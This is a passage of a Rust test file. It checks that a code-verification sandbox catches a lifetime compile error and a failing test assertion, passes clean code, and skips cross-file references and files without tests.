    std::fs::write(&bad, "pub fn f(a: &str, b: &str) -> Vec<&str> { vec![a, b] }\n").unwrap();
    let res = crate::check_rs_compiles(&bad, 20);
    assert!(res.is_some(), "E0106 生命週期錯誤必須被攔截");
    assert!(res.unwrap().contains("E0106"));
}

#[test]
fn test_check_rs_compiles_passes_clean_and_skips_crate_refs() {
    let dir = std::env::temp_dir().join("agnes_align_test");
    let _ = std::fs::create_dir_all(&dir);
    let good = dir.join("good.rs");
    std::fs::write(&good, "pub fn add(a: i64, b: i64) -> i64 { a + b }\n").unwrap();
    assert!(crate::check_rs_compiles(&good, 20).is_none(), "正確代碼必須通過");

    let xref = dir.join("xref.rs");
    std::fs::write(&xref, "use crate::db::Task;\npub fn t(_x: Task) {}\n").unwrap();
    assert!(
        crate::check_rs_compiles(&xref, 20).is_none(),
        "跨檔引用屬 crate 層級依賴，單檔檢查必須跳過不誤報"
    );
}

// ─── 沙盒對齊第二階段：真實執行測試取 Exit Code ──────────────────────────────

#[test]
fn test_run_rs_tests_catches_failing_assertion() {
    let dir = std::env::temp_dir().join("agnes_runtest");
    let _ = std::fs::create_dir_all(&dir);
    let bad = dir.join("bad_assert.rs");
    // 實作與測試期望不一致：double 寫成 +1，測試期望 *2
    std::fs::write(&bad,
        "pub fn double(x: i64) -> i64 { x + 1 }\n#[cfg(test)]\nmod t { use super::*; #[test] fn d() { assert_eq!(double(2), 4); } }\n",
    ).unwrap();
    let res = crate::run_rs_tests(&bad, 20);
    assert!(res.is_some(), "測試斷言失敗必須被執行階段攔截");
    assert!(res.unwrap().contains("FAILED"), "回饋必須含測試失敗證據");
}

#[test]
fn test_run_rs_tests_passes_correct_and_skips_no_test() {
    let dir = std::env::temp_dir().join("agnes_runtest");
    let _ = std::fs::create_dir_all(&dir);
    let good = dir.join("good_assert.rs");
    std::fs::write(&good,
        "pub fn double(x: i64) -> i64 { x * 2 }\n#[cfg(test)]\nmod t { use super::*; #[test] fn d() { assert_eq!(double(2), 4); } }\n",
    ).unwrap();
    assert!(crate::run_rs_tests(&good, 20).is_none(), "測試全綠必須通過");

    let notest = dir.join("notest.rs");
    std::fs::write(&notest, "pub fn f() -> i64 { 1 }\n").unwrap();
    assert!(crate::run_rs_tests(&notest, 20).is_none(), "無測試模組必須跳過");
}
